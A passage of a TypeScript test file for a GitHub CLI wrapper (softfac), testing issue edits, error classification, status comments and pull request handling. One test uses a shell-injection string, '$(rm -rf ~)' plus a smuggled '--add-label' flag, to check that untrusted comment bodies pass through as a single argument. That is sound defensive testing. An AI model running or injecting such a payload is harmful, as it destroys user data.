  }),
);

it.effect("setState surfaces a failing edit", () =>
  Effect.gen(function* () {
    const t = setup(reply(labelsReply(["factory:ready"])), fail(1, "label does not exist"));
    const error = yield* t.err(t.github.setState(6, "triage"));
    assert.strictEqual(error._tag, "GitHubFailed");
    if (error._tag !== "GitHubFailed") return;
    assert.strictEqual(error.stderr, "label does not exist");
    assert.deepStrictEqual(error.args.slice(0, 3), ["issue", "edit", "6"]);
    assert.strictEqual(t.calls().length, 2);
  }),
);

it.effect("unassign removes the user", () =>
  Effect.gen(function* () {
    const t = setup(reply(""));
    yield* t.ok(t.github.unassign(6, "rawphp"));
    assert.deepStrictEqual(t.calls(), [editCall("--remove-assignee", "rawphp")]);
  }),
);

it.effect("assign adds the user and a failure is an error", () =>
  Effect.gen(function* () {
    const t = setup(reply(""));
    yield* t.ok(t.github.assign(6, "rawphp"));
    assert.deepStrictEqual(t.calls(), [editCall("--add-assignee", "rawphp")]);

    const failing = setup(fail(1, "HTTP 403\n"));
    assert.strictEqual(
      (yield* failing.err(failing.github.assign(6, "rawphp")))._tag,
      "GitHubFailed",
    );
  }),
);

it.effect("a non-zero exit carries args, status and stderr", () =>
  Effect.gen(function* () {
    const t = setup(fail(4, "HTTP 404: Not Found\n"));
    const error = yield* t.err(t.github.listIssues("ready"));
    assert.strictEqual(error._tag, "GitHubFailed");
    if (error._tag !== "GitHubFailed") return;
    assert.deepStrictEqual(error.args.slice(0, 2), ["issue", "list"]);
    assert.strictEqual(error.status, 4);
    assert.strictEqual(error.stderr, "HTTP 404: Not Found\n");
    assert.include(error.message, "gh issue list --repo rawphp/softfac");
    assert.include(error.message, "status 4");
    assert.include(error.message, "HTTP 404: Not Found");
  }),
);

it("only a failure with HTTP 404 in stderr is not found", () => {
  const args = ["api", "repos/rawphp/softfac/branches/x"];
  const failed = (stderr: string) => new GitHubFailed({ args, status: 1, stderr });
  assert.isTrue(isNotFound(failed("gh: Not Found (HTTP 404)")));
  assert.isTrue(isNotFound(failed("HTTP 404: Not Found\n")));
  const others: ReadonlyArray<GitHubError> = [
    failed("gh: Server Error (HTTP 500)"),
    failed("gh: Forbidden (HTTP 403)"),
    new GitHubTimedOut({ args, seconds: 30 }),
    new GitHubSpawnError({ args, cause: new Error("HTTP 404") }),
    new GitHubOutputTooLarge({ args, limit: 1024 }),
    new GitHubParse({ args, expected: "HTTP 404" }),
    new GitHubInvalidArgument({ argument: "HTTP 404", expected: "x" }),
    new GitHubRateLimited({ args, stderr: "HTTP 404 API rate limit" }),
  ];
  for (const other of others) assert.isFalse(isNotFound(other), other._tag);
});

it("only a failure GitHub never received is not received", () => {
  const args = ["api", "repos/rawphp/softfac/issues"];
  const failed = (stderr: string) => new GitHubFailed({ args, status: 1, stderr });
  assert.isTrue(
    isNotReceived(failed('Get "https://api.github.com/x": net/http: TLS handshake timeout')),
  );
  assert.isTrue(
    isNotReceived(
      failed('Post "https://api.github.com/x": dial tcp 140.82.112.6:443: i/o timeout'),
    ),
  );
  assert.isTrue(
    isNotReceived(
      failed('Get "https://api.github.com/x": dial tcp 1.2.3.4:443: connect: connection refused'),
    ),
  );
  assert.isTrue(
    isNotReceived(
      failed('Get "https://api.github.com/x": dial tcp: lookup api.github.com: no such host'),
    ),
  );
  const others: ReadonlyArray<GitHubError> = [
    failed("HTTP 502: Bad Gateway (https://api.github.com/graphql)"),
    failed("HTTP 404: Not Found"),
    failed('Get "https://api.github.com/x": read tcp 10.0.0.2:5000->1.2.3.4:443: i/o timeout'),
    new GitHubTimedOut({ args, seconds: 30 }),
    new GitHubRateLimited({ args, stderr: "net/http: TLS handshake timeout" }),
  ];
  for (const other of others) assert.isFalse(isNotReceived(other), other._tag);
});

it("a read's unexpected EOF is transient, but GitHub may have received it", () => {
  const args = ["api", "user"];
  const failed = (stderr: string) => new GitHubFailed({ args, status: 1, stderr });
  const eofs = [
    failed('Get "https://api.github.com/user": unexpected EOF'),
    failed('Post "https://api.github.com/graphql": unexpected EOF'),
  ];
  for (const eof of eofs) {
    assert.isTrue(isTransientRead(eof), eof.stderr);
    assert.isFalse(isNotReceived(eof), eof.stderr);
  }
  assert.isTrue(isTransientRead(failed("net/http: TLS handshake timeout")));
  const others: ReadonlyArray<GitHubError> = [
    failed("HTTP 502: Bad Gateway (https://api.github.com/graphql)"),
    failed("failed to parse JSON: unexpected EOF"),
    failed(
      'Get "https://api.github.com/x": read tcp 10.0.0.2:5000->1.2.3.4:443: read: connection reset by peer',
    ),
    new GitHubTimedOut({ args, seconds: 30 }),
    new GitHubRateLimited({ args, stderr: 'Get "https://api.github.com/user": unexpected EOF' }),
  ];
  for (const other of others) assert.isFalse(isTransientRead(other), other._tag);
});

it.effect("a signal-killed gh is a failure with status -1", () =>
  Effect.gen(function* () {
    const t = setup(signalKilled());
    const error = yield* t.err(t.github.unassign(6, "rawphp"));
    assert.strictEqual(error._tag, "GitHubFailed");
    if (error._tag !== "GitHubFailed") return;
    assert.strictEqual(error.status, -1);
    assert.include(error.message, "status -1");
  }),
);

it.effect("malformed JSON is a parse error carrying the args", () =>
  Effect.gen(function* () {
    const t = setup(reply("not json"));
    const error = yield* t.err(t.github.listIssues("ready"));
    assert.strictEqual(error._tag, "GitHubParse");
    if (error._tag !== "GitHubParse") return;
    assert.deepStrictEqual(error.args, t.calls()[0]);
    assert.include(error.expected, "JSON array of issues");
    assert.include(error.message, "unexpected output");
    assert.include(error.message, "gh issue list --repo rawphp/softfac");

    const labels = setup(reply('{"labels":"nope"}'));
    const labelsError = yield* labels.err(labels.github.setState(6, "ready"));
    assert.strictEqual(labelsError._tag, "GitHubParse");
    if (labelsError._tag !== "GitHubParse") return;
    assert.deepStrictEqual(labelsError.args, viewLabelsCall);
    assert.strictEqual(labels.calls().length, 1);
  }),
);

it.effect("a spawn failure is a spawn error carrying the args", () =>
  Effect.gen(function* () {
    const t = setup(spawnError());
    const error = yield* t.err(t.github.listIssues("ready"));
    assert.strictEqual(error._tag, "GitHubSpawnError");
    if (error._tag !== "GitHubSpawnError") return;
    assert.deepStrictEqual(error.args, t.calls()[0]);
    assert.include(error.message, "gh issue list --repo rawphp/softfac");
    assert.include(error.message, "gh not found");

    const unassign = setup(spawnError());
    const unassignError = yield* unassign.err(unassign.github.unassign(6, "rawphp"));
    assert.strictEqual(unassignError._tag, "GitHubSpawnError");
    if (unassignError._tag !== "GitHubSpawnError") return;
    assert.deepStrictEqual(unassignError.args, editCall("--remove-assignee", "rawphp"));
  }),
);

it.effect("a gh the shell cannot find or run is a spawn error, not a failed call", () =>
  Effect.gen(function* () {
    for (const [status, stderr] of [
      [127, "sh: gh: not found\n"],
      [126, "sh: /usr/local/bin/gh: Permission denied\n"],
    ] as const) {
      const t = setup(fail(status, stderr));
      const error = yield* t.err(t.github.listIssues("ready"));
      assert.strictEqual(error._tag, "GitHubSpawnError", stderr);
      if (error._tag !== "GitHubSpawnError") return;
      assert.deepStrictEqual(error.args, t.calls()[0]);
      assert.include(error.message, stderr.trim());
    }
    const other = setup(fail(2, "unknown flag"));
    assert.strictEqual((yield* other.err(other.github.listIssues("ready")))._tag, "GitHubFailed");
  }),
);

it.effect("a timed out gh is a timeout error", () =>
  Effect.gen(function* () {
    const t = setup(timedOut());
    const error = yield* t.err(t.github.listIssues("ready"));
    assert.strictEqual(error._tag, "GitHubTimedOut");
    if (error._tag !== "GitHubTimedOut") return;
    assert.strictEqual(error.seconds, 60);
    assert.include(error.message, "timed out after 60 s");
    assert.match(error.message, /^`gh issue list .*` timed out after 60 s$/);
  }),
);

it.effect("output past the cap is an error, never a truncation", () =>
  Effect.gen(function* () {
    const t = setup(truncated());
    const error = yield* t.err(t.github.listIssues("ready"));
    assert.strictEqual(error._tag, "GitHubOutputTooLarge");
    if (error._tag !== "GitHubOutputTooLarge") return;
    assert.strictEqual(error.limit, 8 * 1024 * 1024);
    assert.include(error.message, `printed more than ${8 * 1024 * 1024} bytes`);
    assert.match(error.message, /^`gh issue list .*` printed more than/);
  }),
);

it.effect("only the rate limit is read as a rate limit", () =>
  Effect.gen(function* () {
    for (const stderr of [
      "GraphQL: API rate limit already exceeded for user ID 1.",
      "gh: API rate limit exceeded (HTTP 403)",
      "HTTP 403: You have exceeded a secondary rate limit. Please wait a few minutes before you try again.",
      "gh: Too Many Requests (HTTP 429)",
    ]) {
      const t = setup(fail(1, stderr));
      const error = yield* t.err(t.github.listIssues("ready"));
      assert.strictEqual(error._tag, "GitHubRateLimited");
      if (error._tag !== "GitHubRateLimited") return;
      assert.strictEqual(error.stderr, stderr);
      assert.include(error.args, "list");
      assert.include(error.message, "gh issue list --repo rawphp/softfac");
      assert.include(error.message, `hit GitHub's rate limit: ${stderr}`);
    }
    const other = setup(fail(1, "HTTP 404: Not Found"));
    assert.strictEqual((yield* other.err(other.github.listIssues("ready")))._tag, "GitHubFailed");
  }),
);

it.effect("a success that mentions the rate limit is not an error", () =>
  Effect.gen(function* () {
    const t = setup(reply("[]", "API rate limit"));
    const issues = yield* t.ok(t.github.listIssues("ready"));
    assert.deepStrictEqual(issues, { items: [], cut: false });
  }),
);

it.effect("postComment appends the marker", () =>
  Effect.gen(function* () {
    const t = setup(reply("https://github.com/rawphp/softfac/issues/6#issuecomment-1\n"));
    yield* t.ok(t.github.postComment(6, "hello"));
    assert.deepStrictEqual(t.calls(), [commentCall("6", "hello\n\n<!-- softfac -->")]);
    assert.strictEqual(MARKER, "<!-- softfac -->");
    assert.strictEqual(STATUS_MARKER, "<!-- softfac:status -->");
  }),
);

it.effect("untrusted bodies arrive as one unmodified argument", () =>
  Effect.gen(function* () {
    const nasty = "$(rm -rf ~) `id` \"q\" 'q' ; | && > /tmp/x\nsecond line\n--add-label evil";
    const expected = `${nasty}\n\n${MARKER}`;
    const status = `${nasty}\n\n${STATUS_MARKER}`;

    const post = setup(reply(""));
    yield* post.ok(post.github.postComment(6, nasty));
    assert.deepStrictEqual(post.calls(), [commentCall("6", expected)]);

    const create = setup(reply("[]"), reply(""));
    yield* create.ok(create.github.upsertStatusComment(6, "rawphp", nasty));
    assert.deepStrictEqual(create.calls()[1], commentCall("6", status));

    const patch = setup(
      reply('[{"id":77,"user":{"login":"rawphp"},"body":"old\\n\\n<!-- softfac:status -->"}]'),
      reply(""),
    );
    yield* patch.ok(patch.github.upsertStatusComment(6, "rawphp", nasty));
    assert.deepStrictEqual(patch.calls()[1], patchCall("77", status));
  }),
);

it.effect("postComment errors carry the status and stderr", () =>
  Effect.gen(function* () {
    const t = setup(fail(1, "issue is locked"));
    const error = yield* t.err(t.github.postComment(6, "x"));
    assert.strictEqual(error._tag, "GitHubFailed");
    if (error._tag !== "GitHubFailed") return;
    assert.strictEqual(error.status, 1);
    assert.strictEqual(error.stderr, "issue is locked");
    assert.include(error.message, "issue is locked");
  }),
);

it.effect("the status comment is created when absent", () =>
  Effect.gen(function* () {
    const listing =
      '[{"id":1,"user":{"login":"rawphp"},"created_at":"2026-10-04T10:13:16Z","body":"a person\'s comment"},{"id":2,"user":{"login":"rawphp"},"created_at":"2026-10-04T10:14:16Z","body":"questions\\n\\n<!-- softfac -->"}]';
    const t = setup(reply(listing), reply(""));
    yield* t.ok(t.github.upsertStatusComment(6, "rawphp", "state: building"));
    assert.deepStrictEqual(t.calls(), [
      listCommentsCall,
      commentCall("6", "state: building\n\n<!-- softfac:status -->"),
    ]);
  }),
);

it.effect("the status comment is patched by id when present", () =>
  Effect.gen(function* () {
    const listing =
      '[{"id":1,"user":{"login":"rawphp"},"created_at":"2026-10-04T10:13:16Z","body":"hi"},{"id":5978910929,"user":{"login":"rawphp"},"created_at":"2026-10-04T10:14:16Z","body":"state: triage\\n\\n<!-- softfac:status -->"}]';
    const t = setup(reply(listing), reply("{}"));
    yield* t.ok(t.github.upsertStatusComment(6, "rawphp", "state: building"));
    assert.deepStrictEqual(t.calls(), [
      listCommentsCall,
      patchCall("5978910929", "state: building\n\n<!-- softfac:status -->"),
    ]);
  }),
);

it.effect("the status comment is never created twice", () =>
  Effect.gen(function* () {
    const created = `[{"id":42,"user":{"login":"rawphp"},"created_at":"2026-10-04T10:13:16Z","body":"one\\n\\n${STATUS_MARKER}"}]`;
    const t = setup(reply("[]"), reply(""), reply(created), reply("{}"));
    yield* t.ok(t.github.upsertStatusComment(6, "rawphp", "one"));
    yield* t.ok(t.github.upsertStatusComment(6, "rawphp", "two"));
    const calls = t.calls();
    assert.strictEqual(calls.length, 4);
    assert.strictEqual(
      calls.filter((call) => call[0] === "issue" && call[1] === "comment").length,
      1,
    );
    assert.deepStrictEqual(calls[3]!.slice(0, 4), [
      "api",
      "-X",
      "PATCH",
      "repos/rawphp/softfac/issues/comments/42",
    ]);
  }),
);

it.effect("a status marker posted by someone else is not adopted", () =>
  Effect.gen(function* () {
    const listing =
      '[{"id":10,"user":{"login":"stranger"},"created_at":"2026-10-04T10:13:16Z","body":"gotcha\\n\\n<!-- softfac:status -->"},{"id":11,"user":null,"created_at":"2026-10-04T10:14:16Z","body":"ghost\\n\\n<!-- softfac:status -->"}]';
    const t = setup(reply(listing), reply(""));
    yield* t.ok(t.github.upsertStatusComment(6, "rawphp", "real status"));
    assert.deepStrictEqual(t.calls(), [
      listCommentsCall,
      commentCall("6", "real status\n\n<!-- softfac:status -->"),
    ]);
  }),
);

it.effect("a status marker in the middle of the factory's comment is not adopted", () =>
  Effect.gen(function* () {
    const listing =
      '[{"id":10,"user":{"login":"rawphp"},"created_at":"2026-10-04T10:13:16Z","body":"quoting <!-- softfac:status --> and more text"}]';
    const t = setup(reply(listing), reply(""));
    yield* t.ok(t.github.upsertStatusComment(6, "rawphp", "s"));
    assert.deepStrictEqual(t.calls(), [
      listCommentsCall,
      commentCall("6", "s\n\n<!-- softfac:status -->"),
    ]);
  }),
);

it.effect("the factory's own status comment is found despite case and trailing whitespace", () =>
  Effect.gen(function* () {
    const listing =
      '[{"id":10,"user":{"login":"stranger"},"body":"fake\\n\\n<!-- softfac:status -->"},{"id":12,"user":{"login":"RawPhp"},"body":"state: triage\\n\\n<!-- softfac:status -->\\n\\n"}]';
    const t = setup(reply(listing), reply("{}"));
    yield* t.ok(t.github.upsertStatusComment(6, "rawphp", "s"));
    assert.deepStrictEqual(t.calls()[1], patchCall("12", "s\n\n<!-- softfac:status -->"));
  }),
);

it.effect("the status comment user match is exact, not a prefix", () =>
  Effect.gen(function* () {
    const listing =
      '[{"id":10,"user":{"login":"rawphp-bot"},"body":"a\\n\\n<!-- softfac:status -->"},{"id":11,"user":{"login":"raw"},"body":"b\\n\\n<!-- softfac:status -->"}]';
    const t = setup(reply(listing), reply(""));
    yield* t.ok(t.github.upsertStatusComment(6, "rawphp", "s"));
    assert.deepStrictEqual(t.calls(), [
      listCommentsCall,
      commentCall("6", "s\n\n<!-- softfac:status -->"),
    ]);
  }),
);

it.effect("the status comment is found on a later page", () =>
  Effect.gen(function* () {
    // `gh api --paginate` may print each page as its own array.
    const pages =
      '[{"id":1,"body":"a"}][{"id":2,"body":"b"},{"id":3,"user":{"login":"rawphp"},"body":"state\\n\\n<!-- softfac:status -->"}]';
    const t = setup(reply(pages), reply("{}"));
    yield* t.ok(t.github.upsertStatusComment(6, "rawphp", "x"));
    assert.strictEqual(t.calls()[1]![3], "repos/rawphp/softfac/issues/comments/3");
  }),
);

it.effect("pages split correctly around brackets and quotes inside strings", () =>
  Effect.gen(function* () {
    const pages =
      '[{"id":1,"user":{"login":"x"},"body":"] [ } \\" {"}]\n[{"id":3,"user":{"login":"rawphp"},"body":"s\\n\\n<!-- softfac:status -->"}]';
    const t = setup(reply(pages), reply("{}"));
    yield* t.ok(t.github.upsertStatusComment(6, "rawphp", "x"));
    assert.strictEqual(t.calls()[1]![3], "repos/rawphp/softfac/issues/comments/3");
  }),
);

it.effect("status comment errors", () =>
  Effect.gen(function* () {
    const spawn = setup(spawnError());
    assert.strictEqual(
      (yield* spawn.err(spawn.github.upsertStatusComment(6, "rawphp", "x")))._tag,
      "GitHubSpawnError",
    );

    const oops = setup(reply("oops"));
    assert.strictEqual(
      (yield* oops.err(oops.github.upsertStatusComment(6, "rawphp", "x")))._tag,
      "GitHubParse",
    );
    assert.strictEqual(oops.calls().length, 1);

    const empty = setup(reply(""));
    const emptyError = yield* empty.err(empty.github.upsertStatusComment(6, "rawphp", "x"));
    assert.strictEqual(emptyError._tag, "GitHubParse");
    if (emptyError._tag !== "GitHubParse") return;
    assert.deepStrictEqual(emptyError.args, listCommentsCall);
    assert.include(emptyError.expected, "output was empty");

    const failing = setup(reply("[]"), fail(1, "rate limited"));
    const failed = yield* failing.err(failing.github.upsertStatusComment(6, "rawphp", "x"));
    assert.strictEqual(failed._tag, "GitHubFailed");
    if (failed._tag !== "GitHubFailed") return;
    assert.strictEqual(failed.stderr, "rate limited");
  }),
);

it.effect("the status comment surfaces a failing patch", () =>
  Effect.gen(function* () {
    const listing =
      '[{"id":12,"user":{"login":"rawphp"},"body":"state: triage\\n\\n<!-- softfac:status -->"}]';
    const t = setup(reply(listing), fail(1, "validation failed"));
    const error = yield* t.err(t.github.upsertStatusComment(6, "rawphp", "s"));
    assert.strictEqual(error._tag, "GitHubFailed");
    if (error._tag !== "GitHubFailed") return;
    assert.strictEqual(error.stderr, "validation failed");
    assert.deepStrictEqual(error.args.slice(0, 3), ["api", "-X", "PATCH"]);
    assert.strictEqual(t.calls().length, 2);
  }),
);

it.effect("error text hides comment bodies but the error keeps them", () =>
  Effect.gen(function* () {
    // "hello\nworld" + "\n\n" + the 16-byte marker = 29 bytes.
    const t = setup(fail(1, "boom"));
    const error = yield* t.err(t.github.postComment(6, "hello\nworld"));
    assert.strictEqual(
      error.message,
      "`gh issue comment 6 --repo rawphp/softfac --body <29 bytes>` exited with status 1: boom",
    );
    assert.strictEqual(error._tag, "GitHubFailed");
    if (error._tag !== "GitHubFailed") return;
    assert.strictEqual(error.args.at(-1), "hello\nworld\n\n<!-- softfac -->");

    // Counted in bytes, not characters: "héllo ✓" is 7 chars and 10 bytes, plus 18.
    const utf8 = setup(fail(1, "boom"));
    const shown = (yield* utf8.err(utf8.github.postComment(6, "héllo ✓"))).message;
    assert.include(shown, "--body <28 bytes>");
    assert.notInclude(shown, "llo");
  }),
);

it.effect("error text hides raw field bodies", () =>
  Effect.gen(function* () {
    const listing =
      '[{"id":77,"user":{"login":"rawphp"},"body":"old\\n\\n<!-- softfac:status -->"}]';
    const t = setup(reply(listing), fail(1, "gone"));
    const shown = (yield* t.err(t.github.upsertStatusComment(6, "rawphp", "private status")))
      .message;
    assert.include(shown, "repos/rawphp/softfac/issues/comments/77 -f body=<39 bytes>");
    assert.notInclude(shown, "private");
  }),
);

it("error text escapes newlines in other arguments", () => {
  assert.strictEqual(
    new GitHubParse({ args: ["issue", "edit", "a\nb\r\nc"], expected: "x" }).message,
    "`gh issue edit a\\nb\\r\\nc` returned unexpected output: x",
  );
  assert.strictEqual(
    new GitHubInvalidArgument({ argument: "a\nb", expected: "a plain file path" }).message,
    'refused "a\\nb" before calling gh: expected a plain file path',
  );
  assert.strictEqual(
    new GitHubSpawnError({ args: ["--body"], cause: new Error("nope") }).message,
    "cannot start `gh --body`: nope",
  );
});

const HEAD_SHA = "4f1c2d3e4a5b60718293a4b5c6d7e8f901234567";
const PR_VIEW =
  '{"createdAt":"2026-10-29T05:50:00Z","baseRefName":"main","headRefName":"t3code/2bb65018","headRefOid":"4f1c2d3e4a5b60718293a4b5c6d7e8f901234567","isCrossRepository":false,"isDraft":true,"mergeable":"MERGEABLE","number":2,"state":"OPEN"}';
const prView = (state: string, draft: boolean) =>
  `{"createdAt":"2026-10-29T05:50:00Z","baseRefName":"main","headRefName":"x","headRefOid":"${HEAD_SHA}","isCrossRepository":false,"isDraft":${draft},"mergeable":"MERGEABLE","number":9,"state":"${state}"}`;
const prViewCall = (number: string) => [
  "pr",
  "view",
  number,
  "--repo",
  REPO,
  "--json",
  "number,isDraft,state,headRefName,isCrossRepository,baseRefName,headRefOid,mergeable,createdAt",
];

it.effect("pullRequest reads the real shape with the exact call", () =>
  Effect.gen(function* () {
    const t = setup(reply(PR_VIEW));
    const pr = yield* t.ok(t.github.pullRequest(2));
    assert.deepStrictEqual(t.calls(), [prViewCall("2")]);
    assert.deepStrictEqual(pr, {
      number: 2,
      isDraft: true,
      open: true,
      merged: false,
      headRef: "t3code/2bb65018",
      crossRepository: false,
      baseRef: "main",
      headSha: HEAD_SHA,
      mergeable: "mergeable",
      createdAt: "2026-10-29T05:50:00Z",
    });
  }),
);

it.effect("pullRequest reads GitHub's mergeable state, and anything else as unknown", () =>
  Effect.gen(function* () {
    for (const [raw, mergeable] of [
      ["MERGEABLE", "mergeable"],
      ["CONFLICTING", "conflicting"],
      ["UNKNOWN", "unknown"],
      ["SOMETHING_NEW", "unknown"],
    ] as const) {
      const t = setup(reply(PR_VIEW.replace('"MERGEABLE"', `"${raw}"`)));
      const pr = yield* t.ok(t.github.pullRequest(2));
      assert.deepStrictEqual(t.calls(), [prViewCall("2")], raw);
      assert.strictEqual(pr?.mergeable, mergeable, raw);
    }
  }),
);

it.effect("pullRequest says when it is merged and is then not open", () =>
  Effect.gen(function* () {
    const merged = setup(reply(PR_VIEW.replace('"state":"OPEN"', '"state":"MERGED"')));
    const pr = yield* merged.ok(merged.github.pullRequest(2));
    assert.isTrue(pr?.merged);
    assert.isFalse(pr?.open);
    const closed = setup(reply(PR_VIEW.replace('"state":"OPEN"', '"state":"CLOSED"')));
    const other = yield* closed.ok(closed.github.pullRequest(2));
    assert.isFalse(other?.merged);
    assert.isFalse(other?.open);
  }),
);

it.effect("pullRequest from a fork and into another base says so", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        `{"createdAt":"2026-10-29T05:50:00Z","baseRefName":"release/1.0","headRefName":"t3code/x","headRefOid":"${HEAD_SHA}","isCrossRepository":true,"isDraft":true,"mergeable":"MERGEABLE","number":4,"state":"OPEN"}`,
      ),
    );
    const pr = yield* t.ok(t.github.pullRequest(4));
    assert.isTrue(pr?.crossRepository);
    assert.strictEqual(pr?.baseRef, "release/1.0");
    assert.strictEqual(pr?.headRef, "t3code/x");
  }),
);

it.effect("a pullRequest view without the fork or base fields is a parse error", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        `{"createdAt":"2026-10-29T05:50:00Z","headRefName":"x","headRefOid":"${HEAD_SHA}","isDraft":true,"mergeable":"MERGEABLE","number":3,"state":"OPEN"}`,
      ),
    );
    const error = yield* t.err(t.github.pullRequest(3));
    assert.strictEqual(error._tag, "GitHubParse");
  }),
);

it.effect("a pullRequest view without the head commit is a parse error", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        '{"createdAt":"2026-10-29T05:50:00Z","baseRefName":"main","headRefName":"x","isCrossRepository":false,"isDraft":true,"mergeable":"MERGEABLE","number":3,"state":"OPEN"}',
      ),
    );
    const error = yield* t.err(t.github.pullRequest(3));
    assert.strictEqual(error._tag, "GitHubParse");
  }),
);

it.effect("pullRequest reads the head commit as given", () =>
  Effect.gen(function* () {
    const sha = "0123456789abcdef0123456789abcdef01234567";
    const t = setup(
      reply(
        `{"createdAt":"2026-10-29T05:50:00Z","baseRefName":"main","headRefName":"x","headRefOid":"${sha}","isCrossRepository":false,"isDraft":true,"mergeable":"MERGEABLE","number":3,"state":"OPEN"}`,
      ),
    );
    assert.strictEqual((yield* t.ok(t.github.pullRequest(3)))?.headSha, sha);
  }),
);

it.effect("a pullRequest whose creation time is not a UTC second is a parse error", () =>
  Effect.gen(function* () {
    for (const at of ["", "2026-10-29T05:50:00+10:00", "2026-10-29T05:50:00.5Z", "yesterday"]) {
      const t = setup(reply(PR_VIEW.replace("2026-10-29T05:50:00Z", at)));
      const error = yield* t.err(t.github.pullRequest(2));
      assert.strictEqual(error._tag, "GitHubParse", at);
    }
  }),
);

it.effect("a pullRequest whose head commit is not a full id is a parse error", () =>
  Effect.gen(function* () {
    for (const sha of ["", "4f1c2d3", `${HEAD_SHA}0`, HEAD_SHA.replaceAll("4", "g")]) {
      const t = setup(reply(PR_VIEW.replace(HEAD_SHA, sha)));
      const error = yield* t.err(t.github.pullRequest(2));
      assert.strictEqual(error._tag, "GitHubParse", sha);
    }
  }),
);

it.effect("pullRequest merged and closed are not open", () =>
  Effect.gen(function* () {
    for (const state of ["MERGED", "CLOSED"]) {
      const t = setup(reply(prView(state, false)));
      const pr = yield* t.ok(t.github.pullRequest(9));
      assert.isFalse(pr?.open, state);
      assert.isFalse(pr?.isDraft, state);
    }
  }),
);

it.effect("pullRequestSummary reads what a person sees, with its state in one word", () =>
  Effect.gen(function* () {
    const view = (state: string, draft: boolean, extra = "") =>
      `{"number":9,"title":"feat: x","body":null,"state":"${state}","isDraft":${draft},"additions":12,"deletions":3,"changedFiles":1,"reviewDecision":"CHANGES_REQUESTED"${extra}}`;
    const t = setup(
      reply(view("OPEN", true, ',"files":[{"path":"a.ts","additions":12,"deletions":3}]')),
      reply(view("OPEN", false)),
      reply(view("MERGED", false)),
      reply(view("CLOSED", true)),
      fail(1, "GraphQL: Could not resolve to a PullRequest with the number of 9."),
    );
    const first = yield* t.ok(t.github.pullRequestSummary(9));
    assert.deepStrictEqual(first, {
      number: 9,
      title: "feat: x",
      body: "",
      state: "draft",
      additions: 12,
      deletions: 3,
      changedFiles: 1,
      reviewDecision: "changes_requested",
      files: [{ path: "a.ts", additions: 12, deletions: 3 }],
    });
    assert.deepStrictEqual(t.calls()[0], [
      "pr",
      "view",
      "9",
      "--repo",
      REPO,
      "--json",
      "number,title,body,state,isDraft,additions,deletions,changedFiles,reviewDecision,files",
    ]);
    const states = [];
    for (let i = 0; i < 3; i += 1)
      states.push((yield* t.ok(t.github.pullRequestSummary(9)))?.state);
    assert.deepStrictEqual(states, ["open", "merged", "closed"]);
    assert.isNull(yield* t.ok(t.github.pullRequestSummary(9)));
  }),
);

it.effect("a pullRequest that does not exist is null", () =>
  Effect.gen(function* () {
    for (const stderr of [
      "GraphQL: Could not resolve to a PullRequest with the number of 999. (repository.pullRequest)\n",
      "graphql: could not resolve to a pullrequest with the number of 999.",
      "GRAPHQL: COULD NOT RESOLVE TO A PULLREQUEST",
    ]) {
      const t = setup(fail(1, stderr));
      assert.isNull(yield* t.ok(t.github.pullRequest(999)), stderr);
    }
  }),
);

it.effect("any other pullRequest failure stays an error", () =>
  Effect.gen(function* () {
    for (const stderr of [
      "HTTP 502: Bad Gateway",
      "Could not resolve host: api.github.com",
      "Could not resolve to an Issue with the number of 5.",
      "",
    ]) {
      const t = setup(fail(1, stderr));
      const error = yield* t.err(t.github.pullRequest(999));
      assert.strictEqual(error._tag, "GitHubFailed", stderr);
      if (error._tag === "GitHubFailed") assert.strictEqual(error.status, 1, stderr);
    }
    const t = setup(spawnError());
    const error = yield* t.err(t.github.pullRequest(999));
    assert.strictEqual(error._tag, "GitHubSpawnError");
  }),
);

it.effect("pullRequest errors are typed", () =>
  Effect.gen(function* () {
    const failed = setup(fail(1, "no pull requests found"));
    assert.strictEqual((yield* failed.err(failed.github.pullRequest(2)))._tag, "GitHubFailed");
    const parse = setup(reply("{}"));
    assert.strictEqual((yield* parse.err(parse.github.pullRequest(2)))._tag, "GitHubParse");
  }),
);

it.effect("issue and pullRequest calls use the number they are given", () =>
  Effect.gen(function* () {
    const t = setup(reply(issueJson(["factory:ready"], [], '"b"')), reply(prView("OPEN", true)));
    yield* t.ok(t.github.issue(7));
    yield* t.ok(t.github.pullRequest(3));
    assert.deepStrictEqual(t.calls(), [
      [
        "issue",
        "view",
        "7",
        "--repo",
        REPO,
        "--json",
        "number,title,body,labels,assignees,state,author",
      ],
      prViewCall("3"),
    ]);
  }),
);

const readyCall = ["pr", "ready", "9", "--repo", REPO];
const undoCall = [...readyCall, "--undo"];

it.effect("markPrReady runs gh pr ready", () =>
  Effect.gen(function* () {
    const t = setup(reply(""));
    yield* t.ok(t.github.markPrReady(9));
    assert.deepStrictEqual(t.calls(), [readyCall]);

    const failed = setup(fail(1, "not a draft"));
    const error = yield* failed.err(failed.github.markPrReady(9));
    assert.strictEqual(error._tag, "GitHubFailed");
  }),
);

it.effect("markPrReady on a PR that is already ready is success", () =>
  Effect.gen(function* () {
    // What `gh` 2.102 does: it warns on stderr and exits 0.
    const stderr = '! Pull request rawphp/softfac#9 is already "ready for review"\n';
    const warned = setup(reply("", stderr));
    yield* warned.ok(warned.github.markPrReady(9));

    // Should a version exit non-zero for it, the PR is still ready: that is success too.
    const failed = setup(fail(1, stderr));
    yield* failed.ok(failed.github.markPrReady(9));
    assert.deepStrictEqual(failed.calls(), [readyCall]);
  }),
);

it.effect("markPrReady still fails for a closed PR or any other error", () =>
  Effect.gen(function* () {
    for (const stderr of [
      '! Pull request rawphp/softfac#9 is closed. Only draft pull requests can be marked as "ready for review"\n',
      "GraphQL: Resource not accessible by integration\n",
      "",
    ]) {
      const t = setup(fail(1, stderr));
      const error = yield* t.err(t.github.markPrReady(9));
      assert.strictEqual(error._tag, "GitHubFailed", stderr);
    }
  }),
);

it.effect("markPrDraft runs gh pr ready --undo", () =>
  Effect.gen(function* () {
    const t = setup(reply(""));
    yield* t.ok(t.github.markPrDraft(9));
    assert.deepStrictEqual(t.calls(), [undoCall]);

    const failed = setup(fail(1, "GraphQL: Resource not accessible by integration\n"));
    const error = yield* failed.err(failed.github.markPrDraft(9));
    assert.strictEqual(error._tag, "GitHubFailed");
  }),
);

it.effect("markPrDraft on a PR that is already a draft is success", () =>
  Effect.gen(function* () {
    // What `gh` does for `--undo` on a draft: it warns on stderr and exits 0. Should a version
    // exit non-zero for it, the PR is still a draft: that is success too.
    const stderr = '! Pull request rawphp/softfac#9 is already "in draft"\n';
    const warned = setup(reply("", stderr));
